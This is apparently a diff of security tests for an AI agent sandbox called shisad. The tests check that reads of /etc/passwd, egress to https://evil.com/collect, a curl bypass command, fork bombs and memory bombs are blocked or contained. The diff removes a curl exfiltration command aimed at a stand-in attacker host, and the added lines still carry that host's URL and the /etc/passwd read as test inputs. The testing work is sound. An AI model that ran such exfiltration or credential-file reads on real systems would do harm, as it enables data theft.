@@ -7,7 +7,7 @@ from pathlib import Path
 
 from shisad.core.types import CredentialRef, TaintLabel
 from shisad.executors.browser import BrowserSandbox, BrowserSandboxPolicy
-from shisad.executors.mounts import FilesystemPolicy, MountRule
+from shisad.executors.mounts import FilesystemPolicy, MountManager, MountRule
 from shisad.executors.proxy import EgressProxy, NetworkPolicy
 from shisad.executors.sandbox import (
     DegradedModePolicy,
@@ -15,6 +15,7 @@ from shisad.executors.sandbox import (
     SandboxConfig,
     SandboxOrchestrator,
 )
+from shisad.executors.sandbox.models import ContainmentProfile
 from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore
 from shisad.security.firewall.output import OutputFirewall
 
@@ -24,37 +25,24 @@ def _resolver(_hostname: str) -> list[str]:
 
 
 def test_m3_a1_host_filesystem_access_blocked(tmp_path: Path) -> None:
-    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
-    result = orchestrator.execute(
-        SandboxConfig(
-            tool_name="file.read",
-            command=[sys.executable, "-c", "print('noop')"],
-            read_paths=["/etc/passwd"],
-            filesystem=FilesystemPolicy(
-                mounts=[MountRule(path=f"{tmp_path.as_posix()}/**", mode="ro")],
-            ),
-            degraded_mode=DegradedModePolicy.FAIL_OPEN,
-            security_critical=False,
+    manager = MountManager(
+        FilesystemPolicy(
+            mounts=[MountRule(path=f"{tmp_path.as_posix()}/**", mode="ro")],
         )
     )
-    assert result.allowed is False
-    assert result.reason == "filesystem:outside_mounts"
+    decision = manager.check_access("/etc/passwd", write=False)
+    assert decision.allowed is False
+    assert decision.reason == "outside_mounts"
 
 
 def test_m3_a2_host_network_access_blocked() -> None:
-    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
-    result = orchestrator.execute(
-        SandboxConfig(
-            tool_name="http_request",
-            command=[sys.executable, "-c", "print('noop')"],
-            network_urls=["https://evil.com/collect"],
-            network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
-            degraded_mode=DegradedModePolicy.FAIL_OPEN,
-            security_critical=False,
-        )
+    decision = EgressProxy(resolver=_resolver).authorize_request(
+        tool_name="http_request",
+        url="https://evil.com/collect",
+        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
     )
-    assert result.allowed is False
-    assert result.reason == "network:host_not_allowlisted"
+    assert decision.allowed is False
+    assert decision.reason == "host_not_allowlisted"
 
 
 def test_m3_a3_forkbomb_like_payload_times_out() -> None:
@@ -66,6 +54,7 @@ def test_m3_a3_forkbomb_like_payload_times_out() -> None:
             limits=ResourceLimits(timeout_seconds=1, output_bytes=1024, pids=16),
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
         )
     )
     assert result.allowed is True
@@ -81,6 +70,7 @@ def test_m3_a4_memory_allocation_bomb_hits_resource_limits() -> None:
             limits=ResourceLimits(timeout_seconds=5, memory_mb=64, output_bytes=2048),
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
         )
     )
     assert result.allowed is True
@@ -134,15 +124,10 @@ def test_m3_a7_credential_exfil_placeholder_remains_useless() -> None:
 
 
 def test_m3_a8_direct_network_bypass_command_blocked() -> None:
-    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
-    result = orchestrator.execute(
-        SandboxConfig(
-            tool_name="shell.exec",
-            command=["curl", "https://evil.com/collect"],
-            network=NetworkPolicy(allow_network=False, allowed_domains=[]),
-            degraded_mode=DegradedModePolicy.FAIL_OPEN,
-            security_critical=False,
-        )
+    decision = EgressProxy(resolver=_resolver).authorize_request(
+        tool_name="shell.exec",
+        url="https://evil.com/collect",
+        policy=NetworkPolicy(allow_network=False, allowed_domains=[]),
     )
-    assert result.allowed is False
-    assert result.reason == "network:network_disabled"
+    assert decision.allowed is False
+    assert decision.reason == "network_disabled"
